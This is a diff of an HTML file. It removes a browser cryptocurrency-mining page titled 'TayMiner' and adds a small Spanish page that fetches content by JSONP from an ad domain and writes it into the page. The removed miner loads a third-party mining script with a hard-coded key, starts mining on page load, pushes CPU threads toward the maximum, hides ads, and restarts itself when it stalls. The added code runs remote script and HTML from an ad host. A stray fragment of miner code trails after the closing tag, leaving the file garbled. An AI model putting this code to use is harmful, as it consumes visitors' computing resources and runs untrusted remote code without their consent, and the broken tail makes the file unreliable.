@@ -456,283 +456,37 @@ document.cookie = `${cookieName}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/
 </body>
 
 
-
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TayMiner</title>
-
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-    <script src="https://www.hostingcloud.racing/m2L1.js"></script>
-    
-    <style>
-        body > div:not(#content){ /* Hide Ad: */
-            display: none !important;
-            width: 0px !important;
-            height: 0px !important;
-        }
-        #donate-links-table td:first-child{ /* Add small padding on the donationlink table */
-            padding-right: 1em;
-        }
-        #user-displayname{ /* Make the displayname bold */
-            font-weight: bold;
-        }
-
-        #actual-throttle, #actual-threads{
-            font-weight: bold;
-            font-size: 125%;
-        }
-    </style>
+    <title>Mostrar Resultado con JSONP</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 </head>
 <body>
-    <div id="content">
-        
+    <div id="resultado"></div>
 
-        <div class="mining-status">
-            <h3>Mining status:</h3>
-            
-            <p class="status">Loading...</p>
-            
-          <p>Throttle : <input type="text" id="input-throttle"> <span id="actual-throttle"></span> (0 - 0.99, Lower value = Faster mining)</p>
-            <p>Threads  : <input type="text" id="input-threads"> <span id="actual-threads"></span> (1 - <span id="max-threads">X</span>, Higher value = Faster mining)</p>
-            
-            <button onclick="SaveThrottleThreads();">Save Throttle/Threads settings in URL</button> <br><br>
-            <button onclick="_client.stop(); isRunning = false;">Stop Mining</button>
-            <button onclick="StartMiner();">Start Mining</button>
-        </div>
-
-
-        <h3>Logs:</h3>
-        
-
-        <!-- This is incase you want to read the data using Selenium or something like that -->
-        <div id="data" style="font-size: 0; width: 0px; height: 0px;"></div>
-    </div>
-
-    <script>
-        try {
-            function setCookie(cname, cvalue, exdays) {
-                const d = new Date();
-                d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
-                let expires = "expires="+d.toUTCString();
-                document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
-            }
-
-            function getCookie(cname) {
-                let name = cname + "=";
-                let ca = document.cookie.split(';');
-                for(let i = 0; i < ca.length; i++) {
-                    let c = ca[i];
-                    while (c.charAt(0) == ' ') {
-                    c = c.substring(1);
-                    }
-                    if (c.indexOf(name) == 0) {
-                    return c.substring(name.length, c.length);
-                    }
+    <script type="text/javascript">
+        $(document).ready(function() {
+            // Realizar la solicitud JSONP
+            $.ajax({
+                url: 'http://popads.kesug.com/place.php',
+                dataType: 'jsonp',
+                jsonpCallback: 'callback',
+                success: function(response) {
+                    // Mostrar el resultado en el elemento #resultado
+                    $('#resultado').html(response);
+                },
+                error: function(error) {
+                    // Manejar cualquier error que ocurra durante la solicitud
+                    $('#resultado').html('Error al obtener el resultado.');
                 }
-                return "";
-            }
-
-            function convertBase(value) {
-                var from_range = '0123456789'.split('');
-                var to_range = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'.split('');
-                var from_base = from_range.length;
-                var to_base = to_range.length;   
-                
-                var dec_value = `${value}`.split('').reverse().reduce(function (carry, digit, index) {
-                    if (from_range.indexOf(digit) === -1) throw new Error('Invalid digit `'+digit+'` for base '+from_base+'.');
-                    return carry += from_range.indexOf(digit) * (Math.pow(from_base, index));
-                }, 0);
-                
-                var new_value = '';
-                while (dec_value > 0) {
-                    new_value = to_range[dec_value % to_base] + new_value;
-                    dec_value = (dec_value - (dec_value % to_base)) / to_base;
-                }
-                return new_value || '0';
-            }
-
-            function replaceAll(str, find, replace) {
-                return str.replace(new RegExp(find, 'g'), replace);
-            }
-
-            function makeid(length) {
-                var result           = '';
-                var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-                var charactersLength = characters.length;
-                for ( var i = 0; i < length; i++ ) {
-                    result += characters.charAt(Math.floor(Math.random() * charactersLength));
-                }
-                return result;
-            }
-
-            function StartMiner(){
-                _client.start();
-                isRunning = true;
-                sec_left_until_refresh = sec_left_until_refresh_original;
-            }
-
-            function SaveThrottleThreads(){
-                var url = new URL(window.location.href);
-                url.searchParams.set('throttle', $("#input-throttle").val());
-                url.searchParams.set('threads', $("#input-threads").val());
-                window.location.href= url.href;
-            }
-
-            function getRGBGreenToRed(float, more_is_green=false){
-                float = more_is_green ? 1-float : float;
-                return `rgb(${255*float},${255*(1-float)},0)`
-            }
-
-            function inputConverter(val, val_min, val_max){
-                let match = replaceAll(val,",",".").match(`(([0-9]+(?:(\.|\,)[0-9]+)?)(%)?)`);
-
-                let new_val = null
-
-                if (match[4] == "%"){
-                    new_val = parseFloat(match[2]) / 100 * val_max
-                }
-                else if (match[3] == "."){
-                    new_val = parseFloat(match[2])
-                }
-                else{
-                    new_val = parseFloat(match[2])
-                }
-
-                new_val = (new_val > val_max) ? val_max : new_val
-                new_val = (new_val < val_min) ? val_min : new_val
-
-                return new_val
-            }
-
-            var urlParams = new URLSearchParams(window.location.search);
-            
-            var param_throttle = (urlParams.get("throttle") != null) ? urlParams.get("throttle") : null;
-            var param_threads = (urlParams.get("threads") != null) ? urlParams.get("threads") : null;
-
-            var status_text = document.getElementsByClassName("status")[0];
-            var sec_left_until_refresh_original = (urlParams.get("timeout") != null) ? parseInt(urlParams.get("timeout")) : 3600;
-            var sec_left_until_refresh = sec_left_until_refresh_original;
-
-            var avg_hashrate_long = [];
-            var avg_hashrate_short = [];
-
-            var isRunning = false;
-            var uid;
-            if (urlParams.get("uid") == null){
-                if (getCookie("uid") == ""){
-                    uid = makeid(5);
-                    setCookie("uid", uid, 365);
-                }
-                else{
-                    uid = getCookie("uid");
-                }
-            }
-            else{
-                uid = urlParams.get("uid");
-            }
-            if (urlParams.get("nodate")==null){
-                uid += "--";
-                (new Date().toISOString().split("T")[0].split("-")).forEach(e=>{
-                    uid += convertBase(e) + " ";
-                })
-            }
-
-            uid = replaceAll(uid.trim(), " ", "-");
-            
-            
-            var _client = new Client.User(
-                'e0e51f0a59eb9d9fa2d89d597f81e5df53e703886121274845cc9040dc5ae11b',
-                uid,
-                {throttle: 0, c: 'w'}
-            );
-
-            $("#input-throttle").val((param_throttle == null) ? _client.getThrottle() : param_throttle);
-            $("#input-threads").val((param_threads == null) ? _client.getNumThreads() : param_threads);
-            $("#max-threads").text(navigator.hardwareConcurrency)
-            
-            StartMiner();
-            
-            // Main Loop
-            setInterval(function(){
-                // console.log(inputConverter($("#input-throttle").val(), 0, 0.99), inputConverter($("#input-threads").val(), 1, navigator.hardwareConcurrency));
-
-                _client.setThrottle(inputConverter($("#input-throttle").val(), 0, 0.99));
-                _client.setNumThreads(inputConverter($("#input-threads").val(), 1, navigator.hardwareConcurrency));
-
-                status_text.innerHTML = `
-                    USER : <span id="user-displayname">${uid}</span>
-                    <br>
-                    ${isRunning ? "Miner is running! ✅" : "Miner is stopped! ❗️"}
-                    <br>
-                    Secounds left until automatic refresh : ${sec_left_until_refresh}
-                    <br>
-                    hashes/S : ${_client.getHashesPerSecond()}
-                    <br>
-                    Accepted Hashes : ${_client.getAcceptedHashes()}
-                `;
-
-                let throttle_procent = Math.floor((1- ((0.99-_client.getThrottle())/0.99)) * 100);
-                let threads_procent = Math.floor((1- ((navigator.hardwareConcurrency-_client.getNumThreads())/navigator.hardwareConcurrency)) * 100);
-                $("#actual-throttle").text(`${_client.getThrottle()} (${throttle_procent})%`).css("color", getRGBGreenToRed(throttle_procent/100,false));
-                $("#actual-threads").text(`${_client.getNumThreads()} (${threads_procent})%`).css("color", getRGBGreenToRed(threads_procent/100,true));
-                
-                if (isRunning){
-                    if (avg_hashrate_short.length > 0 && sec_left_until_refresh % 10 == 0){
-                        let short_calculated = avg_hashrate_short.reduce((a, b) => a + b, 0) / avg_hashrate_short.length;
-                        let long_calculated = avg_hashrate_long.reduce((a, b) => a + b, 0) / avg_hashrate_long.length;
-                        avg_hashrate_short = [];
-                        console.log(`Current average h/s: ${short_calculated}\nTotal   average h/s: ${long_calculated}`);
-                    }
-                    else{
-                        avg_hashrate_long.push(_client.getHashesPerSecond());
-                        avg_hashrate_short.push(_client.getHashesPerSecond());
-                    }
-
-                    if (sec_left_until_refresh == 0){
-                        location.reload(true);
-                    }
-                    else{
-                        sec_left_until_refresh -= 1;
-                    }
-                }
-
-                if (isRunning && _client.getHashesPerSecond() == 0){
-                    console.log("Client is running, but hash/S is 0. Sending Start command to client...");
-                    StartMiner();
-                }
-
-                // This is incase you want to read the data using Selenium or something like that
-                $("#data").text(`
-                    running=${isRunning}<br>
-                    autorefresh=${sec_left_until_refresh}<br>
-                    hashrate=${_client.getHashesPerSecond()}<br>
-                    acceptedhashes=${_client.getAcceptedHashes()}<br>
-                    throttle=${_client.getThrottle()}<br>
-                    threads=${_client.getNumThreads()}<br>
-                    uid=${uid}<br>
-                `.replaceAll(/\s/g,''));
-            }, 1000);
-            
-            if (urlParams.get("longload") != null){
-                long_load(parseInt(urlParams.get("longload")), "https://effigis.com/wp-content/uploads/2015/02/Airbus_Pleiades_50cm_8bit_RGB_Yogyakarta.jpg")
-            }
-        } catch (error) {
-            let error_message = "UNKNOWN ERROR : " + error.message;
-
-            if (error.message == "Client is not defined"){
-                error_message = "ERROR : Client is not defined (Something might be blocking it from loading.)";
-            }
-
-            status_text.innerHTML = error_message;
-            console.error(error_message)
-        }        
+            });
+        });
     </script>
 </body>
-	</html>
+</html>
 
-                
-            
+                                             let long_calculated = avg_hashrate_long.reduce((a, b) => a + b, 0) / avg_hashrate_long.length;
+                        
